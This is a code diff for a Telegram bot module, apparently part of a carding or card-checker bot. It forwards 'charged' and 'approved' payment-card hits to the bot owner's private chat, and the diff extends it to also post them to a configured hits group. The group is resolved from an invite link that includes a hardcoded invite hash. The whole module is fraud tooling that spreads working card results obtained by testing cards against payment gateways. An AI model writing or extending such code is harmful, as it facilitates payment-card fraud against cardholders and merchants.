@@ -1,14 +1,16 @@
 """
-Forward Hits to Owner
-Forwards all charged and approved cards to the bot owner's private chat.
+Forward Hits to Owner and Group
+Forwards all charged and approved cards to the bot owner's private chat and hits group.
 """
 
 from pyrogram import Client
 from pyrogram.enums import ParseMode
 from BOT.config_loader import get_config
 
-# Cache owner ID
+# Cache owner ID and group
 _owner_id = None
+_hits_group = None
+_hits_group_resolved = None
 
 
 def get_owner_id() -> int:
@@ -18,6 +20,73 @@ def get_owner_id() -> int:
         config = get_config()
         _owner_id = int(config.get("OWNER", 0))
     return _owner_id
+
+
+def get_hits_group() -> str:
+    """Get the hits group from config."""
+    global _hits_group
+    if _hits_group is None:
+        config = get_config()
+        _hits_group = config.get("HITS_GROUP", "")
+    return _hits_group
+
+
+async def resolve_hits_group(client: Client):
+    """Resolve the hits group invite link to chat ID."""
+    global _hits_group_resolved
+    if _hits_group_resolved is not None:
+        return _hits_group_resolved
+
+    hits_group = get_hits_group()
+    if not hits_group:
+        return None
+
+    try:
+        # If it's already a numeric ID
+        if hits_group.lstrip('-').isdigit():
+            _hits_group_resolved = int(hits_group)
+            return _hits_group_resolved
+
+        # If it's an invite link, try to get chat info
+        if "t.me/" in hits_group:
+            # Extract the invite hash
+            if "+KpdKVEtwhkZkZWU1" in hits_group or "/+" in hits_group:
+                # It's a private invite link - try to get chat
+                try:
+                    chat = await client.get_chat(hits_group)
+                    _hits_group_resolved = chat.id
+                    return _hits_group_resolved
+                except Exception:
+                    # Try with the invite hash directly
+                    invite_hash = hits_group.split("+")[-1] if "+" in hits_group else hits_group.split("/")[-1]
+                    try:
+                        chat = await client.get_chat(f"https://t.me/+{invite_hash}")
+                        _hits_group_resolved = chat.id
+                        return _hits_group_resolved
+                    except Exception:
+                        pass
+            else:
+                # It's a public username
+                username = hits_group.split("/")[-1].replace("@", "")
+                try:
+                    chat = await client.get_chat(username)
+                    _hits_group_resolved = chat.id
+                    return _hits_group_resolved
+                except Exception:
+                    pass
+
+        # Try as username
+        try:
+            chat = await client.get_chat(hits_group)
+            _hits_group_resolved = chat.id
+            return _hits_group_resolved
+        except Exception:
+            pass
+
+    except Exception as e:
+        print(f"[forward_hits] Error resolving hits group: {e}")
+
+    return None
 
 
 async def forward_hit_to_owner(
@@ -35,7 +104,7 @@ async def forward_hit_to_owner(
     extra_info: dict = None
 ) -> bool:
     """
-    Forward a charged/approved card to the owner's private chat.
+    Forward a charged/approved card to the owner's private chat and hits group.
 
     Args:
         client: Pyrogram client instance
@@ -55,8 +124,6 @@ async def forward_hit_to_owner(
         True if forwarded successfully, False otherwise
     """
     owner_id = get_owner_id()
-    if not owner_id:
-        return False
 
     try:
         # Determine header based on status
@@ -89,7 +156,7 @@ async def forward_hit_to_owner(
         else:
             gateway_display = gateway
 
-        # Build the hit message for owner
+        # Build the hit message
         hit_message = f"""<b>🔔 HIT ALERT | {header}</b> ✦
 ━━━━━━━━━━━━━━━
 <b>[#] Gateway:</b> <code>{gateway_display}</code>
@@ -107,16 +174,34 @@ async def forward_hit_to_owner(
 ━━━━━━━━━━━━━━━"""
 
         # Send to owner
-        await client.send_message(
-            chat_id=owner_id,
-            text=hit_message,
-            parse_mode=ParseMode.HTML,
-            disable_web_page_preview=True
-        )
+        if owner_id:
+            try:
+                await client.send_message(
+                    chat_id=owner_id,
+                    text=hit_message,
+                    parse_mode=ParseMode.HTML,
+                    disable_web_page_preview=True
+                )
+            except Exception as e:
+                print(f"[forward_hits] Error sending to owner: {e}")
+
+        # Send to hits group
+        hits_group_id = await resolve_hits_group(client)
+        if hits_group_id:
+            try:
+                await client.send_message(
+                    chat_id=hits_group_id,
+                    text=hit_message,
+                    parse_mode=ParseMode.HTML,
+                    disable_web_page_preview=True
+                )
+            except Exception as e:
+                print(f"[forward_hits] Error sending to hits group: {e}")
+
         return True
 
     except Exception as e:
-        print(f"[forward_hits] Error forwarding to owner: {e}")
+        print(f"[forward_hits] Error forwarding hit: {e}")
         return False
 
 
